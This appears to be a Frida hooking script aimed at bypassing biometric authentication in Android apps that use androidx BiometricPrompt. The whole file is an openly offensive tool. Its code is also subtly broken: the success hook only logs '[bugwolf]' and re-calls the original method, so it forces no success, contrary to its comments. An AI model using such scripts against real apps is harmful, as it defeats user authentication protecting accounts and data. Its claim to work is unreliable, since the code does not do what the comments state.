// bypass_biometric.js
// Force BiometricPrompt to succeed.
Java.perform(function () {
    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt$PromptInfo$Builder');
    if (BiometricPrompt) {
        BiometricPrompt.setNegativeButtonText.overload(
            'java.lang.CharSequence'
        ).implementation = function (text) {
            return this.setNegativeButtonText('Cancel');
        };
    }

    // Hook BiometricManager and force authentication success.
    var AuthCallback = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
    AuthCallback.onAuthenticationSucceeded.overload(
        'androidx.biometric.BiometricPrompt$AuthenticationResult'
    ).implementation = function (result) {
        console.log('[bugwolf] biometric success injected');
        // Re-emit the callback.
        this.onAuthenticationSucceeded(result);
    };
});
